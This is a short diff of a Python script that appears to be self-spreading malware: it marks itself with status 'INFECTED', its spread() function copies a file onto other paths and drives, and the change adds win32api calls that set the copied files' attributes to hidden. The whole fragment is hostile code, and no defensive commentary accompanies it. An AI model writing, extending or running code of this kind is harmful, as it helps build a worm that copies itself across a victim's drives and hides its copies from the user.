@@ -2,7 +2,8 @@ import shutil
 import os
 import sys
 import getpass
-
+import win32con
+import win32api
 
 status = 'INFECTED'
 
@@ -26,8 +27,8 @@ def spread():
                 shutil.copyfile(abspath, new_path)
             except Exception:
                 pass
-        else:
-            pass
+            else:
+                win32api.SetFileAttributes(abspath, win32con.FILE_ATTRIBUTE_HIDDEN)
 
     for drive in drives:
         if os.path.isdir(drive):
